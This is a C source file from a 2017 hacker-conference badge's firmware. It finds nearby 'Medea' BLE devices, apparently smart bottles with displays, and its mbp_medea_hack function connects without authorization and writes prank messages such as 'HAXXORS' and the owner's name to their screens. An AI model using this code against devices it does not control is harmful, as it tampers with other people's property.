/*****************************************************************************
 * (C) Copyright 2017 AND!XOR LLC (http://andnxor.com/).
 *
 * PROPRIETARY AND CONFIDENTIAL UNTIL AUGUST 1ST, 2017 then,
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * Contributors:
 * 	@andnxor
 * 	@zappbrandnxor
 * 	@hyr0n1
 * 	@andrewnriley
 * 	@lacosteaef
 * 	@bitstr3m
 *****************************************************************************/
#include "system.h"
#define MEDEA_SERVICE_UUID					{0xfb,0x34,0x9b,0x5f,0x80,0x00,0x00,0x80,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00}		/** Little endian **/
#define MEDEA_UUID_MESSAGE_SERVICE			0xFFF1
#define MEDEA_UUID_MESSAGE_DISPLAY_CHAR		0xFF02
#define MEDEA_UUID_MESSAGE_SLOT_0_CHAR		0xFF03
#define MEDEA_UUID_MESSAGE_SLOT_1_CHAR		0xFF04
#define MEDEA_UUID_MESSAGE_SLOT_2_CHAR		0xFF05
#define MEDEA_UUID_MESSAGE_SLOT_3_CHAR		0xFF06

#define MEDEA_IBEACON_UUID_1		{0xe8,0x85,0xb3,0x24,0xe5,0xe7,0x42,0xd7,0xac,0xcc,0x4c,0x96,0x1e,0x65,0x8f,0x76}
#define MEDEA_IBEACON_UUID_2		{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x11,0x00,0x00,0x00,0x00,0x00,0x00}
#define MEDEA_IBEACON_UUID_OFFSET	4
#define MEDEA_DISPLAY_ONCE			1
#define MEDEA_DISPLAY_REPEATING		2
#define MAX_AGE						(60*1000) 		/** 1 min **/

static medea_bottle_t m_bottles[MEDEA_DB_SIZE];
static uint8_t m_bottle_count = 0;
static uint16_t m_conn_handle = BLE_CONN_HANDLE_INVALID;
static uint16_t m_char_handle_display = BLE_GATT_HANDLE_INVALID;
static uint16_t m_char_handle_slot0 = BLE_GATT_HANDLE_INVALID;
static uint16_t m_char_handle_slot1 = BLE_GATT_HANDLE_INVALID;
static uint16_t m_char_handle_slot2 = BLE_GATT_HANDLE_INVALID;
static uint16_t m_char_handle_slot3 = BLE_GATT_HANDLE_INVALID;
static volatile bool m_busy = false;
static bool m_connecting = false;

/**
 * Determine if two bottles are the same
 */
static bool __compare_bottles(medea_bottle_t *p_bottle1, medea_bottle_t *p_bottle2) {
	for (uint8_t i = 0; i < 6; i++) {
		if (p_bottle1->address.addr[i] != p_bottle2->address.addr[i]) {
			return false;
		}
	}
	return true;
}

static void __send_message(char *message, bool loop) {
	uint32_t err_code;

	uint16_t len = 19;

	//Setup memory for
	uint8_t data[len];
	data[0] = 0;
	data[1] = 0;

	//Make sure message is all upper case and copy into packet
	for (uint8_t i = 0; i < MIN(strlen(message), 17); i++) {
	    data[i + 2] = toupper((int)message[i]);
	}
	//Make sure rest of message has blanks to overwrite other data
	for (uint8_t i = MIN(strlen(message), 17); i < 17; i++) {
		data[i + 2] = ' ';
	}

	ble_gattc_write_params_t write_params;
	write_params.offset = 0;
	write_params.flags = 1;
	write_params.p_value = data;
	write_params.handle = m_char_handle_slot1;
	write_params.write_op = BLE_GATT_OP_WRITE_CMD;
	write_params.len = len;

	while (m_busy)
		;
	nrf_delay_ms(200);

	//SEND!
	m_busy = true;
	err_code = sd_ble_gattc_write(m_conn_handle, &write_params);
	APP_ERROR_CHECK(err_code);

	//Start building the display packet
	write_params.len = 2;
	write_params.handle = m_char_handle_display;

	if (loop) {
		data[0] = MEDEA_DISPLAY_REPEATING;
	} else {
		data[0] = MEDEA_DISPLAY_ONCE;
	}
	data[1] = 1;

	while (m_busy)
		;
	nrf_delay_ms(200);

//Send command to display slot 0 once
	m_busy = true;
	APP_ERROR_CHECK(sd_ble_gattc_write(m_conn_handle, &write_params));
}

static void __sort_bottles() {
	//only sort multiple bottles
	if (m_bottle_count <= 1) {
		return;
	}

	//Lazy bubble sort
	for (uint16_t i = 0; i < MIN(m_bottle_count, MEDEA_DB_SIZE); i++) {
		for (uint16_t j = i; j < MIN(m_bottle_count, MEDEA_DB_SIZE) - 1; j++) {
			if (m_bottles[j].last_seen > m_bottles[i].last_seen) {
				//Swap
				medea_bottle_t temp = m_bottles[j];
				m_bottles[j] = m_bottles[j + 1];
				m_bottles[j + 1] = temp;
			}
		}
	}
}

static bool __uuid1_match(uint8_t *field_data) {
	uint8_t uuid[16];
	uint8_t uuid_medea[] = MEDEA_IBEACON_UUID_1;
	memcpy(uuid, field_data + MEDEA_IBEACON_UUID_OFFSET, 16);
	for (uint8_t i = 0; i < 16; i++) {
		if (uuid[i] != uuid_medea[i]) {
			return false;
		}
	}

	return true;
}

static bool __uuid2_match(uint8_t *field_data) {
	uint8_t uuid[16];
	uint8_t uuid_medea[] = MEDEA_IBEACON_UUID_2;
	memcpy(uuid, field_data + MEDEA_IBEACON_UUID_OFFSET, 16);
	for (uint8_t i = 0; i < 16; i++) {
		if (uuid[i] != uuid_medea[i]) {
			return false;
		}
	}

	return true;
}

void mbp_medea_ble_init() {
	ble_uuid128_t base_uuid = { MEDEA_SERVICE_UUID };
	uint8_t uuid_type = BLE_UUID_TYPE_BLE;

	APP_ERROR_CHECK(sd_ble_uuid_vs_add(&base_uuid, &uuid_type));

	ble_uuid_t uuid = {
			.type = uuid_type,
			.uuid = MEDEA_UUID_MESSAGE_SERVICE
	};
	APP_ERROR_CHECK(ble_db_discovery_evt_register(&uuid));
}

uint8_t mbp_medea_bottle_count() {
	return MIN(m_bottle_count, MEDEA_DB_SIZE);
}

medea_bottle_t *mbp_medea_bottle_db_get() {
	return m_bottles;
}

void mbp_medea_hack(void *p_data) {
	m_connecting = true;
	ble_gap_addr_t *p_address = (ble_gap_addr_t *) p_data;
	util_ble_connect(p_address);

	mbp_ui_cls();
	util_gfx_set_font(FONT_SMALL);
	util_gfx_set_cursor(0, 0);
	util_gfx_print("medea-hax0r v3.1.4\n(c) 2017 AND!XOR\n");
	util_gfx_print("Connecting...\n");
	while (m_connecting)
		;

	if (m_char_handle_display != BLE_GATT_HANDLE_INVALID
			&& m_char_handle_slot0 != BLE_GATT_HANDLE_INVALID
			&& m_char_handle_slot1 != BLE_GATT_HANDLE_INVALID) {

		util_gfx_print("Connected to host\n");
		util_gfx_print("Running exploit\n");

		__send_message("JOCO2018", false);
		util_gfx_print(" JOCO2018\n");
		nrf_delay_ms(4500);

		__send_message("HAXXORS", false);
		util_gfx_print("   HAXXORS\n");
		nrf_delay_ms(4500);

		//Send name repeating
		char name[SETTING_NAME_LENGTH];
		mbp_state_name_get(name);
		__send_message(name, true);
		util_gfx_print("  ");
		util_gfx_print(name);
		util_gfx_print("\n");
		nrf_delay_ms(3000);

		//Cleanup
		util_gfx_print("Done.\n");
		util_ble_disconnect();

		util_gfx_print("Any key to quit.");
	} else {
		util_gfx_print("Connection failed!");
	}

	util_button_wait();
	util_button_clear();
}

void mbp_medea_on_advertisement(ble_gap_evt_adv_report_t *p_report) {
	uint8_t *p_data = p_report->data;
	uint8_t adv_index = 0;

	while (adv_index < p_report->dlen) {
		//BLE GAP format is [len][type][data]
		uint8_t field_length = p_data[adv_index];
		uint8_t field_type = p_data[adv_index + 1];
		uint8_t field_data[field_length - 1];

		//Reject invalid data
		if (field_length < 2 || field_length > 26) {
			break;
		}

		memcpy(field_data, p_data + adv_index + 2, field_length - 1);

		//Look at company data
		if (field_type == 0xFF && field_length >= 16 + MEDEA_IBEACON_UUID_OFFSET) {
			bool match = __uuid1_match(field_data) || __uuid2_match(field_data);

			if (match) {
				medea_bottle_t bottle;
				memcpy(&(bottle.address), &(p_report->peer_addr), sizeof(p_report->peer_addr));
				bottle.last_seen = util_millis();

				//Overwrite existing bottle
				bool existing = false;
				for (uint8_t i = 0; i < MIN(m_bottle_count, MEDEA_DB_SIZE); i++) {
					if (__compare_bottles(&bottle, &(m_bottles[i]))) {
						memcpy(&(m_bottles[i]), &bottle, sizeof(medea_bottle_t));
						existing = true;
						break;
					}
				}

				//Put at the end if it's new
				if (!existing) {
					uint8_t index = MIN(m_bottle_count, MEDEA_DB_SIZE - 1);
					memcpy(&(m_bottles[index]), &bottle, sizeof(medea_bottle_t));
					m_bottle_count = index + 1;
				}

				//Put oldest bottles at the end
				__sort_bottles();

				//Remove oldest bottles
				uint32_t now = util_millis();

				while ((m_bottles[m_bottle_count - 1].last_seen + MAX_AGE < now) && m_bottle_count > 0) {
					m_bottle_count--;
				}
			}
		}

		adv_index += field_length + 1;
	}
}

void mbp_medea_on_ble_evt(const ble_evt_t * p_ble_evt) {
	if (p_ble_evt == NULL) {
		return;
	}

	switch (p_ble_evt->header.evt_id) {
	case BLE_EVT_TX_COMPLETE:
		m_busy = false;
		break;

	case BLE_GAP_EVT_DISCONNECTED:
		//fall through
	case BLE_GAP_EVT_TIMEOUT:
		m_conn_handle = BLE_CONN_HANDLE_INVALID;
		m_char_handle_display = BLE_GATT_HANDLE_INVALID;
		m_char_handle_slot0 = BLE_GATT_HANDLE_INVALID;
		m_char_handle_slot1 = BLE_GATT_HANDLE_INVALID;
		m_connecting = false;
		break;
	}
}

/**
 * Medea BLE discovery event handler, this occurs after successful connectiong
 */
void mbp_medea_on_db_disc_evt(const ble_db_discovery_evt_t * p_evt) {
// Check if any medea services are discovered}

	if (p_evt->evt_type == BLE_DB_DISCOVERY_COMPLETE
			&& p_evt->params.discovered_db.srv_uuid.uuid == MEDEA_UUID_MESSAGE_SERVICE) {
		m_conn_handle = p_evt->conn_handle;

		for (uint8_t i = 0; i < p_evt->params.discovered_db.char_count; i++) {

			//Get connection handles for uuids we care about
			switch (p_evt->params.discovered_db.charateristics[i].characteristic.uuid.uuid) {
			case MEDEA_UUID_MESSAGE_DISPLAY_CHAR:
				; // Found display message
				m_char_handle_display = p_evt->params.discovered_db.charateristics[i].characteristic.handle_value;
				break;
			case MEDEA_UUID_MESSAGE_SLOT_0_CHAR:
				; // Found slot 0
				m_char_handle_slot0 = p_evt->params.discovered_db.charateristics[i].characteristic.handle_value;
				break;
			case MEDEA_UUID_MESSAGE_SLOT_1_CHAR:
				; // Found slot 1
				m_char_handle_slot1 = p_evt->params.discovered_db.charateristics[i].characteristic.handle_value;
				break;
			case MEDEA_UUID_MESSAGE_SLOT_2_CHAR:
				; // Found slot 1
				m_char_handle_slot2 = p_evt->params.discovered_db.charateristics[i].characteristic.handle_value;
				break;
			case MEDEA_UUID_MESSAGE_SLOT_3_CHAR:
				; // Found slot 1
				m_char_handle_slot3 = p_evt->params.discovered_db.charateristics[i].characteristic.handle_value;
				break;
			}
		}
		m_connecting = false;
	}
}
